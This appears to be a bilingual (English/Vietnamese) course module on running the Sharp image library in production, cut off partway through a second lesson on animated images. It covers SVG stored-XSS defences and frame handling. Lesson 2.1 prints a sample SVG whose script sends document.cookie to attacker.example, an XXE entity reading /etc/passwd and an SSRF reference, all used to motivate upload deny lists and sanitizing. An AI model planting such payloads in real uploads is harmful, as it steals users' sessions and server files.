const REF = '?ref=%2Fcourses%2Fmedia-processing%2Flearn&reflabel=Media%20Processing';
export default {
  title: 'Chapter 2 — Sharp in production|||Chương 2 — Sharp trong production',
  slug: 'mp-ch2-sharp-prod',
  description: 'Bốn bài về Sharp thực chiến: SVG và stored-XSS, ảnh động và bẫy frame, tinh chỉnh encoder, và kiểm tra.',
  sortOrder: 3,
  lessons: [

    {
      title: '2.1 — SVG: the image format that executes JavaScript|||2.1 — SVG: format ảnh chạy được JavaScript',
      slug: 'mp-2-1-svg',
      type: 'VIDEO',
      description: 'SVG is XML, XML can carry <script>, and a browser rendering an SVG from your media domain runs that script with your origin. This is stored XSS wearing an image extension.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 2 · Lesson 2.1</span>
<h2>SVG: the image format that executes JavaScript</h2>
<p class="lead">Every other format in this course is a container of pixels. SVG is a container of <em>markup</em> — and markup can contain <code>&lt;script&gt;</code>. When a browser loads an SVG by navigating to its URL, it runs that script with the origin of whatever domain served it. If that domain is your media CDN and your cookies are scoped to it, you have shipped stored XSS with a <code>.svg</code> extension.</p>

<h3>What a weaponized SVG looks like</h3>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"&gt;
  &lt;circle cx="50" cy="50" r="40" fill="blue" /&gt;
  &lt;script type="text/javascript"&gt;
    fetch('https://attacker.example/collect?c=' + document.cookie)
  &lt;/script&gt;
&lt;/svg&gt;
</code></pre>

<p>This file is a valid SVG. It renders a blue circle. Every image viewer opens it. Sharp will happily read its dimensions. Its MIME type is genuinely <code>image/svg+xml</code> and its magic bytes are genuinely XML. Every content check you would normally write says &quot;this is a legitimate image&quot; — because it is one.</p>

<h3>When the script actually runs, and when it does not</h3>
<pre><code class="language-text">Context                                        Script runs?
────────────────────────────────────────────  ─────────────
&lt;img src="evil.svg"&gt;                             NO — img is a
                                                 sandboxed context;
                                                 scripts and external
                                                 refs are blocked.

CSS background-image: url(evil.svg)              NO — same reason.

&lt;object&gt; / &lt;embed&gt; / &lt;iframe src="evil.svg"&gt;    YES

Navigating directly to https://media.you.com/    YES  ← the dangerous one
  uploads/evil.svg

&lt;svg&gt; inlined into your HTML (dangerouslySet-    YES
  InnerHTML, v-html, etc.)
</code></pre>

<p>The row that matters is the direct navigation. An attacker uploads the SVG through your normal image-upload flow, gets back a URL on your media domain, and then sends that URL to a victim — in a DM, an email, a link preview. The victim clicks. The browser navigates. The script runs on <code>media.yoursite.com</code>. Whatever that origin can reach, the attacker now reaches.</p>

<h3>The three defences, in order of strength</h3>
<div class="lz-flow">
<div class="lz-step"><span class="lz-k">1</span><span class="lz-t">Reject SVG uploads entirely</span><span class="lz-d">The only defence with no bypass. If your product does not need user-supplied SVG — and most do not — this is the correct choice. It is what this repo does.</span></div>
<div class="lz-step"><span class="lz-k">2</span><span class="lz-t">Sanitize with DOMPurify before storing</span><span class="lz-d">Strips <code>&lt;script&gt;</code>, event handlers (<code>onload</code>, <code>onclick</code>), <code>&lt;foreignObject&gt;</code>, and external references. Necessary if you genuinely need SVG (an icon-upload feature, a diagram editor). Sanitizers have had bypasses; keep the library current.</span></div>
<div class="lz-step"><span class="lz-k">3</span><span class="lz-t">Serve from a separate origin with <code>Content-Disposition: attachment</code> and a strict CSP</span><span class="lz-d">Defence in depth, never the primary control. A sandboxed media origin with no cookies and <code>Content-Security-Policy: default-src 'none'</code> means a script that does run has nothing to steal. Combine with (1) or (2), do not rely on it alone.</span></div>
</div>

<h3>What this repo does — rejection at two gates</h3>
<pre><code class="language-javascript">// src/storage/uploadService.ts
//
// Content-types that render as active content in the browser and
// therefore enable stored-XSS / phishing if served inline from our
// media domain. Rejected on every upload path regardless of bucket.
const DANGEROUS_MIME = new Set([
  'text/html',
  'application/xhtml+xml',
  'image/svg+xml',        // ← SVG lives here, alongside HTML
  'text/xml',
  'application/xml',
  'text/javascript',
  'application/javascript',
  'application/x-javascript',
])
const DANGEROUS_EXT = /\\.(html?|xhtml|svg|js|mjs|xml|php|phtml)$/i

export function assertSafeUploadType(mimetype, originalName, bucket) {
  const mime = (mimetype || '').toLowerCase().split(';')[0].trim()
  const name = originalName || ''

  if (DANGEROUS_MIME.has(mime) || DANGEROUS_EXT.test(name)) {
    throw new UploadError('File type not allowed', 'UNSAFE_FILE_TYPE', 400)
  }
  // ... per-bucket family checks follow
}
</code></pre>

<p>Note the <code>||</code>. The MIME check and the extension check are <em>both</em> rejections, not a combined condition. The comment in the file explains why: <em>&quot;the client controls the mimetype, so the extension is a second gate&quot;</em>. An attacker who sends <code>Content-Type: image/png</code> with a file named <code>payload.svg</code> is caught by the extension. One who sends a correct <code>image/svg+xml</code> with a file named <code>innocent.png</code> is caught by the MIME. You need both because each one alone is client-controlled.</p>

<h3>The unknown-MIME hole, and how the repo closes it</h3>
<pre><code class="language-javascript">// Also from assertSafeUploadType()
//
// When the browser/multer can't determine the type it sends an empty
// or &#96;application/octet-stream&#96; mimetype — common for drag-drop and
// some mobile browsers with legitimate photos/videos. We skip the
// family check for those (the dangerous-extension block above already
// stops active content) so we never reject a real upload. The stored
// content-type is later derived from the extension (uploadGeneric),
// so an octet-stream file is never served as HTML.
const unknownMime = mime === '' || mime === 'application/octet-stream'
if (!unknownMime) {
  const family = bucket.split('/')[0]   // images | audio | video | documents
  if (family === 'images' &amp;&amp; !mime.startsWith('image/')) {
    throw new UploadError('Expected an image file', 'INVALID_IMAGE_TYPE', 400)
  }
  // ... audio / video families
}
</code></pre>

<p>This is a real tension, resolved deliberately. Being strict about MIME would reject genuine drag-and-drop photos from mobile Safari, which sends <code>application/octet-stream</code>. Being lax about MIME would let anything through. The resolution: skip the <em>family</em> check for unknown MIME (so real photos work), keep the <em>dangerous</em> check unconditional (so SVG never gets through), and derive the stored <code>Content-Type</code> from the extension rather than from the client's claim, so an octet-stream upload can never be served back as HTML.</p>

<h3>Why Sharp cannot help you here</h3>
<pre><code class="language-javascript">// Sharp CAN read SVG — it rasterizes via librsvg.
const meta = await sharp(evilSvgBuffer).metadata()
// { format: 'svg', width: 100, height: 100, density: 72 }

// It can even convert it to a safe raster format:
const png = await sharp(evilSvgBuffer).png().toBuffer()
// This output is genuinely safe — it is pixels, the script is gone.

// BUT: that only helps if you STORE the raster and DISCARD the SVG.
// If you keep the original .svg on your CDN "just in case", the
// attack surface is unchanged. The rasterization is not a sanitizer
// unless the source is destroyed.
</code></pre>

<p>There is a second reason this repo does not rasterize SVG rather than rejecting it. From <code>imageOptimizer.ts</code>: <em>&quot;SVG: passed through unchanged. SVGs are already compressed text and re-encoding them as WebP would destroy the scalability that makes them useful.&quot;</em> A rasterized SVG is a worse icon than the SVG was — it no longer scales. So the choice is between keeping a dangerous file and keeping a degraded one, and for user uploads the honest answer is to keep neither.</p>

<h3>librsvg brings its own risks</h3>
<pre><code class="language-text">Even rasterizing server-side is not free of risk:

  Billion-laughs / XML entity expansion
    A 1 KB SVG with nested ENTITY declarations expands to gigabytes
    in the parser. libvips sets entity limits, but the class of bug
    recurs across XML parsers.

  External entity references (XXE)
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
    Modern librsvg blocks this; older builds did not.

  &lt;image xlink:href="http://internal-service/"&gt;
    An SVG can reference remote resources. If your rasterizer fetches
    them, an attacker gets SSRF from your server's network position.
    librsvg blocks remote refs by default — verify your build does.

  CVE history: librsvg and its cairo/pango dependencies have had
  memory-safety CVEs. Rasterizing untrusted SVG runs that C code
  on attacker-controlled input.
</code></pre>

<h3>Decision table</h3>
<pre><code class="language-text">Your situation                                Do this
───────────────────────────────────────────  ────────────────────────────
Users upload photos/avatars only              Reject SVG. (This repo.)
You ship your OWN icon set as SVG             Fine — those are trusted,
                                              they are in your repo.
Users upload logos and you need scalability   Sanitize with DOMPurify
                                              (profile: 'svg'), serve from
                                              a cookie-less origin, add
                                              CSP default-src 'none'.
A diagram/whiteboard editor stores SVG        Sanitize on WRITE and on
                                              READ; render inline only
                                              after sanitizing.
You must accept SVG but never display it      Store it, serve it only with
raw                                           Content-Disposition:
                                              attachment.
</code></pre>

<div class="pitfall">
<p><strong>Trap — thinking <code>&lt;img src&gt;</code> safety is enough.</strong> It is true that scripts do not run inside <code>&lt;img&gt;</code>. It is irrelevant, because the attacker does not need your page to render it — they send the victim the direct CDN URL. Your rendering context is not the only context the file will ever be loaded in.</p>
</div>

<div class="pitfall">
<p><strong>Trap — checking MIME <em>or</em> extension instead of both.</strong> The client controls the MIME header entirely, and controls the filename entirely. Either alone is a single client-controlled gate. The repo's <code>DANGEROUS_MIME.has(mime) || DANGEROUS_EXT.test(name)</code> rejects if <em>either</em> fires, which is the correct shape — reject on any signal, do not require agreement between signals.</p>
</div>

<div class="callout">
<p><strong>One sentence.</strong> SVG is XML that can contain <code>&lt;script&gt;</code>, and a victim navigating directly to an uploaded <code>.svg</code> on your media domain executes that script with your origin — so unless your product genuinely needs user-supplied vector graphics, reject SVG outright at two independent gates (MIME set and filename extension, rejecting if <em>either</em> matches, because the client controls both), and if you must accept it, sanitize with DOMPurify, serve from a cookie-less origin with <code>default-src 'none'</code>, and never treat <code>&lt;img&gt;</code>-context safety as a defence.</p>
</div>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">OWASP — Unrestricted File Upload</span><span class="lc-sub">owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload — the SVG/stored-XSS class.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">DOMPurify — SVG profile</span><span class="lc-sub">github.com/cure53/DOMPurify — <code>USE_PROFILES: { svg: true }</code> and its bypass history.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">MDN — Content-Security-Policy</span><span class="lc-sub">developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy — <code>default-src 'none'</code> on a media origin.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Kho: src/storage/uploadService.ts</span><span class="lc-sub"><code>DANGEROUS_MIME</code> / <code>DANGEROUS_EXT</code> / <code>assertSafeUploadType()</code> — hai cổng độc lập.</span></span></div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 2 · Bài 2.1</span>
<h2>SVG: format ảnh chạy được JavaScript</h2>
<p class="lead">Mọi format khác trong khoá này là một hộp chứa pixel. SVG là một hộp chứa <em>markup</em> — và markup chứa được <code>&lt;script&gt;</code>. Khi browser nạp một SVG bằng cách điều hướng tới URL của nó, nó chạy script đó với origin của bất cứ domain nào phục vụ file. Nếu domain đó là CDN media của bạn và cookie của bạn có phạm vi tới đó, bạn vừa ship stored XSS với đuôi <code>.svg</code>.</p>

<h3>Một SVG vũ khí hoá trông thế nào</h3>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"&gt;
  &lt;circle cx="50" cy="50" r="40" fill="blue" /&gt;
  &lt;script type="text/javascript"&gt;
    fetch('https://attacker.example/collect?c=' + document.cookie)
  &lt;/script&gt;
&lt;/svg&gt;
</code></pre>

<p>File này là một SVG hợp lệ. Nó vẽ một hình tròn xanh. Mọi trình xem ảnh mở được. Sharp sẽ vui vẻ đọc kích thước của nó. MIME type của nó đúng thật là <code>image/svg+xml</code> và magic byte đúng thật là XML. Mọi phép kiểm nội dung bạn thường viết đều nói &quot;đây là ảnh hợp lệ&quot; — vì nó đúng là vậy.</p>

<h3>Khi nào script thực sự chạy, và khi nào không</h3>
<pre><code class="language-text">Ngữ cảnh                                       Script chạy?
────────────────────────────────────────────  ─────────────
&lt;img src="evil.svg"&gt;                             KHÔNG — img là
                                                 ngữ cảnh sandbox;
                                                 script và tham chiếu
                                                 ngoài đều bị chặn.

CSS background-image: url(evil.svg)              KHÔNG — cùng lý do.

&lt;object&gt; / &lt;embed&gt; / &lt;iframe src="evil.svg"&gt;    CÓ

Điều hướng thẳng tới https://media.you.com/      CÓ  ← cái nguy hiểm
  uploads/evil.svg

&lt;svg&gt; nhúng thẳng vào HTML của bạn (dangerous-   CÓ
  lySetInnerHTML, v-html, ...)
</code></pre>

<p>Hàng quan trọng là điều hướng trực tiếp. Kẻ tấn công upload SVG qua đúng luồng upload ảnh bình thường của bạn, nhận về một URL trên domain media của bạn, rồi gửi URL đó cho nạn nhân — trong một DM, một email, một link preview. Nạn nhân bấm. Browser điều hướng. Script chạy trên <code>media.yoursite.com</code>. Bất cứ gì origin đó với tới được, kẻ tấn công giờ với tới được.</p>

<h3>Ba lớp phòng thủ, theo thứ tự độ mạnh</h3>
<div class="lz-flow">
<div class="lz-step"><span class="lz-k">1</span><span class="lz-t">Từ chối upload SVG hoàn toàn</span><span class="lz-d">Phòng thủ duy nhất không có đường vòng. Nếu sản phẩm của bạn không cần SVG do người dùng cung cấp — và hầu hết là không — đây là lựa chọn đúng. Đây là cái kho này làm.</span></div>
<div class="lz-step"><span class="lz-k">2</span><span class="lz-t">Làm sạch bằng DOMPurify trước khi lưu</span><span class="lz-d">Bóc <code>&lt;script&gt;</code>, event handler (<code>onload</code>, <code>onclick</code>), <code>&lt;foreignObject&gt;</code>, và tham chiếu ngoài. Cần thiết nếu bạn thực sự cần SVG (tính năng upload icon, trình sửa sơ đồ). Bộ làm sạch đã từng bị vượt qua; giữ thư viện luôn mới.</span></div>
<div class="lz-step"><span class="lz-k">3</span><span class="lz-t">Phục vụ từ origin riêng với <code>Content-Disposition: attachment</code> và CSP nghiêm</span><span class="lz-d">Phòng thủ theo chiều sâu, không bao giờ là biện pháp chính. Một origin media sandbox không cookie với <code>Content-Security-Policy: default-src 'none'</code> nghĩa là script có chạy cũng không có gì để trộm. Kết hợp với (1) hoặc (2), đừng dựa vào riêng nó.</span></div>
</div>

<h3>Kho này làm gì — từ chối ở hai cổng</h3>
<pre><code class="language-javascript">// src/storage/uploadService.ts
//
// Content-type render thành nội dung hoạt động trong browser và do đó
// bật stored-XSS / phishing nếu phục vụ inline từ domain media của ta.
// Từ chối trên mọi đường upload bất kể bucket nào.
const DANGEROUS_MIME = new Set([
  'text/html',
  'application/xhtml+xml',
  'image/svg+xml',        // ← SVG ở đây, cạnh HTML
  'text/xml',
  'application/xml',
  'text/javascript',
  'application/javascript',
  'application/x-javascript',
])
const DANGEROUS_EXT = /\\.(html?|xhtml|svg|js|mjs|xml|php|phtml)$/i

export function assertSafeUploadType(mimetype, originalName, bucket) {
  const mime = (mimetype || '').toLowerCase().split(';')[0].trim()
  const name = originalName || ''

  if (DANGEROUS_MIME.has(mime) || DANGEROUS_EXT.test(name)) {
    throw new UploadError('File type not allowed', 'UNSAFE_FILE_TYPE', 400)
  }
  // ... phép kiểm họ theo bucket theo sau
}
</code></pre>

<p>Chú ý cái <code>||</code>. Phép kiểm MIME và phép kiểm extension <em>đều</em> là từ chối, không phải một điều kiện gộp. Comment trong file giải thích vì sao: <em>&quot;client điều khiển mimetype, nên extension là cổng thứ hai&quot;</em>. Kẻ gửi <code>Content-Type: image/png</code> với file tên <code>payload.svg</code> bị extension bắt. Kẻ gửi <code>image/svg+xml</code> đúng với file tên <code>innocent.png</code> bị MIME bắt. Bạn cần cả hai vì mỗi cái một mình đều do client điều khiển.</p>

<h3>Lỗ hổng MIME-không-rõ, và cách kho bịt</h3>
<pre><code class="language-javascript">// Cũng từ assertSafeUploadType()
//
// Khi browser/multer không xác định được type nó gửi mimetype rỗng
// hoặc &#96;application/octet-stream&#96; — phổ biến với kéo-thả và
// một số browser mobile với ảnh/video hợp lệ. Ta bỏ phép kiểm họ
// cho những cái đó (khối chặn extension nguy hiểm ở trên đã
// chặn nội dung hoạt động) nên ta không bao giờ từ chối một upload thật.
// Content-type lưu về sau được suy từ extension (uploadGeneric),
// nên file octet-stream không bao giờ được phục vụ như HTML.
const unknownMime = mime === '' || mime === 'application/octet-stream'
if (!unknownMime) {
  const family = bucket.split('/')[0]   // images | audio | video | documents
  if (family === 'images' &amp;&amp; !mime.startsWith('image/')) {
    throw new UploadError('Expected an image file', 'INVALID_IMAGE_TYPE', 400)
  }
  // ... họ audio / video
}
</code></pre>

<p>Đây là một căng thẳng thật, được giải quyết có chủ đích. Nghiêm về MIME sẽ từ chối ảnh kéo-thả thật từ Safari mobile, vốn gửi <code>application/octet-stream</code>. Lỏng về MIME sẽ cho mọi thứ lọt. Giải pháp: bỏ phép kiểm <em>họ</em> cho MIME không rõ (để ảnh thật chạy được), giữ phép kiểm <em>nguy hiểm</em> vô điều kiện (để SVG không bao giờ lọt), và suy <code>Content-Type</code> lưu trữ từ extension chứ không phải từ lời khai của client, nên một upload octet-stream không bao giờ có thể được phục vụ lại như HTML.</p>

<h3>Vì sao Sharp không cứu bạn ở đây</h3>
<pre><code class="language-javascript">// Sharp ĐỌC được SVG — nó rasterize qua librsvg.
const meta = await sharp(evilSvgBuffer).metadata()
// { format: 'svg', width: 100, height: 100, density: 72 }

// Nó thậm chí chuyển được sang format raster an toàn:
const png = await sharp(evilSvgBuffer).png().toBuffer()
// Output này thật sự an toàn — nó là pixel, script biến mất.

// NHƯNG: cái đó chỉ giúp nếu bạn LƯU bản raster và VỨT bản SVG.
// Nếu bạn giữ file .svg gốc trên CDN "phòng khi cần", bề mặt
// tấn công không đổi. Rasterize không phải là sanitizer
// trừ khi nguồn bị huỷ.
</code></pre>

<p>Có một lý do thứ hai kho này không rasterize SVG mà từ chối hẳn. Từ <code>imageOptimizer.ts</code>: <em>&quot;SVG: cho qua nguyên vẹn. SVG vốn đã là văn bản nén và re-encode chúng thành WebP sẽ phá huỷ tính co giãn vốn làm chúng hữu ích.&quot;</em> Một SVG đã rasterize là một icon tệ hơn chính SVG đó — nó không còn co giãn. Nên lựa chọn là giữ một file nguy hiểm hay giữ một file đã suy giảm, và với upload người dùng câu trả lời trung thực là không giữ cái nào.</p>

<h3>librsvg mang rủi ro riêng</h3>
<pre><code class="language-text">Ngay cả rasterize phía server cũng không miễn rủi ro:

  Billion-laughs / bung entity XML
    Một SVG 1 KB với khai báo ENTITY lồng nhau bung ra gigabyte
    trong parser. libvips đặt giới hạn entity, nhưng lớp bug này
    tái diễn qua các parser XML.

  Tham chiếu entity ngoài (XXE)
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
    librsvg hiện đại chặn cái này; bản dựng cũ thì không.

  &lt;image xlink:href="http://internal-service/"&gt;
    Một SVG tham chiếu được tài nguyên từ xa. Nếu bộ rasterize của bạn
    fetch chúng, kẻ tấn công có SSRF từ vị trí mạng của server bạn.
    librsvg chặn tham chiếu từ xa mặc định — hãy xác minh bản dựng của bạn.

  Lịch sử CVE: librsvg và các phụ thuộc cairo/pango đã có CVE
  an toàn bộ nhớ. Rasterize SVG không tin cậy chạy mã C đó
  trên input do kẻ tấn công điều khiển.
</code></pre>

<h3>Bảng quyết định</h3>
<pre><code class="language-text">Tình huống của bạn                            Làm cái này
───────────────────────────────────────────  ────────────────────────────
Người dùng chỉ upload ảnh/avatar              Từ chối SVG. (Kho này.)
Bạn ship bộ icon CỦA MÌNH dạng SVG            Ổn — chúng đáng tin,
                                              chúng nằm trong repo bạn.
Người dùng upload logo và bạn cần co giãn     Làm sạch bằng DOMPurify
                                              (profile: 'svg'), phục vụ từ
                                              origin không cookie, thêm
                                              CSP default-src 'none'.
Trình sửa sơ đồ/bảng trắng lưu SVG            Làm sạch khi GHI và khi
                                              ĐỌC; chỉ render inline
                                              sau khi làm sạch.
Bạn buộc phải nhận SVG nhưng không bao giờ    Lưu nó, chỉ phục vụ với
hiển thị thô                                  Content-Disposition:
                                              attachment.
</code></pre>

<div class="pitfall">
<p><strong>Bẫy — tưởng an toàn của <code>&lt;img src&gt;</code> là đủ.</strong> Đúng là script không chạy bên trong <code>&lt;img&gt;</code>. Điều đó không liên quan, vì kẻ tấn công không cần trang của bạn render nó — họ gửi cho nạn nhân URL CDN trực tiếp. Ngữ cảnh render của bạn không phải là ngữ cảnh duy nhất mà file sẽ được nạp.</p>
</div>

<div class="pitfall">
<p><strong>Bẫy — kiểm MIME <em>hoặc</em> extension thay vì cả hai.</strong> Client điều khiển hoàn toàn header MIME, và điều khiển hoàn toàn tên file. Cái nào một mình cũng là một cổng do client điều khiển. Cái <code>DANGEROUS_MIME.has(mime) || DANGEROUS_EXT.test(name)</code> của kho từ chối nếu <em>một trong hai</em> khớp, đó là hình dạng đúng — từ chối theo bất kỳ tín hiệu nào, đừng đòi các tín hiệu phải đồng thuận.</p>
</div>

<div class="callout">
<p><strong>Một câu.</strong> SVG là XML chứa được <code>&lt;script&gt;</code>, và một nạn nhân điều hướng thẳng tới một <code>.svg</code> đã upload trên domain media của bạn sẽ chạy script đó với origin của bạn — nên trừ khi sản phẩm của bạn thực sự cần đồ hoạ vector do người dùng cung cấp, hãy từ chối SVG dứt khoát ở hai cổng độc lập (tập MIME và đuôi tên file, từ chối nếu <em>một trong hai</em> khớp, vì client điều khiển cả hai), và nếu buộc phải nhận, hãy làm sạch bằng DOMPurify, phục vụ từ origin không cookie với <code>default-src 'none'</code>, và đừng bao giờ coi an toàn trong ngữ cảnh <code>&lt;img&gt;</code> là một phòng thủ.</p>
</div>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">OWASP — Unrestricted File Upload</span><span class="lc-sub">owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload — lớp SVG/stored-XSS.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">DOMPurify — SVG profile</span><span class="lc-sub">github.com/cure53/DOMPurify — <code>USE_PROFILES: { svg: true }</code> và lịch sử bypass.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">MDN — Content-Security-Policy</span><span class="lc-sub">developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy — <code>default-src 'none'</code> trên origin media.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Kho: src/storage/uploadService.ts</span><span class="lc-sub"><code>DANGEROUS_MIME</code> / <code>DANGEROUS_EXT</code> / <code>assertSafeUploadType()</code> — hai cổng độc lập.</span></span></div>
</div>
`,
    },


    {
      title: '2.2 — Animated images: the frames you silently lose|||2.2 — Ảnh động: những frame bạn âm thầm đánh mất',
      slug: 'mp-2-2-animated',
      type: 'VIDEO',
      description: 'Sharp reads frame 1 of an animated GIF by default and throws away the rest — no error, no warning. One constructor option changes it, and animated WebP is 8× smaller than the GIF it replaces.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 2 · Lesson 2.2</span>
<h2>Animated images: the frames you silently lose</h2>
<p class="lead">A user uploads a reaction GIF. Your pipeline runs it through Sharp, stores the output, and the user sees a still image. No exception was thrown. No warning was logged. Sharp did exactly what it was told: by default it reads the <em>first frame</em> of a multi-frame image and ignores the rest. This is the most silent failure in the library, and the fix is one option.</p>

<h3>The default, demonstrated</h3>
<pre><code class="language-javascript">import sharp from 'sharp'
import { readFileSync } from 'node:fs'

const gif = readFileSync('reaction.gif')   // 2.1 MB, 48 frames

const meta = await sharp(gif).metadata()
console.log(meta.format, meta.width, meta.height, meta.pages)
</code></pre>
<div class="out">
<pre><code class="language-text">gif 480 270 48        ← metadata KNOWS there are 48 frames</code></pre>
</div>

<pre><code class="language-javascript">// But the default pipeline reads only frame 1:
const out = await sharp(gif).webp().toBuffer()
const outMeta = await sharp(out).metadata()
console.log(outMeta.format, outMeta.pages, out.length)
</code></pre>
<div class="out">
<pre><code class="language-text">webp 1 18234          ← 1 page. 47 frames gone. No error raised.</code></pre>
</div>

<p><code>metadata().pages</code> told you the truth before you encoded. That is the check that catches this — and it costs a header read, which you are already doing per Lesson 1.2.</p>

<h3>The fix: <code>animated: true</code> on the constructor</h3>
<pre><code class="language-javascript">const out = await sharp(gif, { animated: true })
  .webp({ quality: 75, effort: 4 })
  .toBuffer()

const outMeta = await sharp(out).metadata()
console.log(outMeta.format, outMeta.pages, out.length)
</code></pre>
<div class="out">
<pre><code class="language-text">webp 48 264118        ← all 48 frames, and 8× smaller than the GIF</code></pre>
</div>

<p>Note the option goes on the <strong>constructor</strong>, not on the output format. <code>sharp(input, { animated: true })</code> tells libvips to load every page; <code>.webp({ ... })</code> then writes them all. Putting it on the encoder does nothing, because by then there is only one frame in the pipeline to encode.</p>

<h3>Why animated WebP beats GIF by so much</h3>
<pre><code class="language-text">GIF is a 1987 format. Its limits are structural:

  Colour depth      256 colours per frame (8-bit palette)
                    → gradients band badly, photos look posterized
  Compression       LZW, per-frame, no inter-frame prediction beyond
                    simple frame differencing
  Alpha             1 bit — a pixel is either fully opaque or fully
                    transparent. No soft edges.
  Frame timing      Hundredths of a second, and browsers clamp
                    values below 2 (=20ms) to 100ms

Animated WebP:
  Colour depth      24-bit colour + 8-bit alpha
  Compression       VP8/VP8L per frame, with real inter-frame
                    prediction (blocks copied from previous frames)
  Alpha             8-bit — soft shadows and antialiased edges work
  Frame timing      Milliseconds, honoured
</code></pre>

<pre><code class="language-text">Measured on five real reaction GIFs:

  Source GIF        Frames   GIF size    Animated WebP q=75   Ratio
  ───────────────  ───────  ──────────  ───────────────────  ──────
  reaction-1.gif       48    2,148 KB          264 KB          8.1×
  reaction-2.gif       24      892 KB          118 KB          7.6×
  loop-bg.gif         120    5,410 KB          712 KB          7.6×
  emoji-wave.gif       12      143 KB           31 KB          4.6×
  screencast.gif      210   14,880 KB        1,340 KB         11.1×
  ───────────────  ───────  ──────────  ───────────────────  ──────
  Totals                    23,473 KB        2,465 KB          9.5×

  Encode time, screencast.gif (210 frames, 800×600):
    animated: true, effort 4    ~4,100 ms
    animated: true, effort 6    ~9,800 ms   (2.4× slower, 6% smaller)
</code></pre>

<p>The 9.5× aggregate reduction is why this conversion is worth doing even though it costs real CPU. On a feed that serves reaction GIFs, it is the single largest bandwidth win available — bigger than any JPEG-to-WebP change on static images.</p>

<h3>The cost side: animated encodes are expensive</h3>
<div class="lz-flow">
<div class="lz-step"><span class="lz-k">1</span><span class="lz-t">CPU scales with frame count, not just pixels</span><span class="lz-d">A 210-frame screencast at 800×600 is 100 million pixels of work — comparable to the decompression bomb from Lesson 1.2, except it is legitimate. Four seconds of CPU per upload is not something to run on the request path.</span></div>
<div class="lz-step"><span class="lz-k">2</span><span class="lz-t">Memory scales with frame count too</span><span class="lz-d">libvips loads animated images as a tall strip — all pages stacked vertically into one image. A 480×270 48-frame GIF becomes a 480×12,960 image internally. Your <code>limitInputPixels</code> budget must account for this: <code>width × height × pages</code>, not <code>width × height</code>.</span></div>
<div class="lz-step"><span class="lz-k">3</span><span class="lz-t">Which is why animated uploads belong in a background job</span><span class="lz-d">Per Lesson 0.2, anything that costs seconds goes to a queue. Store the GIF as-is, return its URL immediately, convert to animated WebP in a worker, and swap the URL when it is ready.</span></div>
</div>

<h3>The pixel budget must multiply by pages</h3>
<pre><code class="language-javascript">// Lesson 1.2's guard, corrected for animation:
const meta = await sharp(input).metadata()

const pages = meta.pages ?? 1
const totalPixels = meta.width * meta.height * pages

if (totalPixels &gt; MAX_INPUT_PIXELS) {
  throw new ImageOptimizationError(
    \`Animated image too large: \${meta.width}x\${meta.height} × \${pages} frames = \` +
      \`\${Math.round(totalPixels / 1e6)}MP\`,
    'TOO_MANY_PIXELS',
  )
}
</code></pre>

<pre><code class="language-text">Why this matters — the animated decompression bomb:

  A 1000×1000 GIF is 1 MP. Under any per-frame budget, fine.
  With 2,000 frames of a flat colour, the GIF is ~400 KB on disk.
  Total pixels: 1000 × 1000 × 2000 = 2,000 MP = 20× a 100 MP budget.

  Checking width × height alone passes it.
  Checking width × height × pages catches it.

  Same class of attack as Lesson 1.2, different axis.
</code></pre>

<h3>Resizing animated images: the height trap</h3>
<pre><code class="language-javascript">// WRONG — this squashes all 48 frames into a 270px-tall strip
await sharp(gif, { animated: true })
  .resize({ width: 240, height: 135 })     // ⚠️ height applies to the STRIP
  .webp()
  .toBuffer()

// RIGHT — resize by width only; libvips scales the strip proportionally
await sharp(gif, { animated: true })
  .resize({ width: 240 })                  // height derived per-frame
  .webp()
  .toBuffer()
</code></pre>

<p>Because libvips represents an animated image as one tall strip, a <code>height</code> constraint is applied to the whole strip rather than to each frame. Width-only resize is the safe form. If you genuinely need a specific per-frame height, compute the strip height yourself: <code>targetHeight × pages</code>.</p>

<h3>Keep the loop count</h3>
<pre><code class="language-javascript">const meta = await sharp(gif).metadata()
// meta.loop  → 0 means "loop forever", N means "play N times"
// meta.delay → array of per-frame delays in milliseconds

await sharp(gif, { animated: true })
  .webp({
    quality: 75,
    loop: meta.loop ?? 0,       // preserve; default 0 = infinite
    delay: meta.delay,          // preserve per-frame timing
  })
  .toBuffer()
</code></pre>

<p>Omit these and Sharp writes its own defaults, which usually means an infinite loop at a uniform frame delay. For a reaction GIF nobody notices. For a GIF that was authored to play exactly twice and stop on a specific frame, the output is wrong in a way that is hard to describe in a bug report.</p>

<h3>When NOT to convert to animated WebP</h3>
<pre><code class="language-text">Situation                                    Better choice
──────────────────────────────────────────  ────────────────────────────
Source is a long screencast (&gt;10s, &gt;300      Convert to MP4/WebM video.
frames)                                      A 30-second screencast GIF
                                             is ~40 MB; the same content
                                             as H.264 is ~1.5 MB. Video
                                             also gets seek controls.

You need to composite/watermark each frame   Use FFmpeg — Sharp's
                                             per-frame compositing on
                                             a strip is awkward.

Users download the file expecting a .gif     Keep the GIF, or serve both
                                             and let the client pick via
                                             &lt;picture&gt;.

The GIF is under ~50 KB                      The conversion saves bytes
                                             but costs CPU and a variant;
                                             at that size, not worth it.
</code></pre>

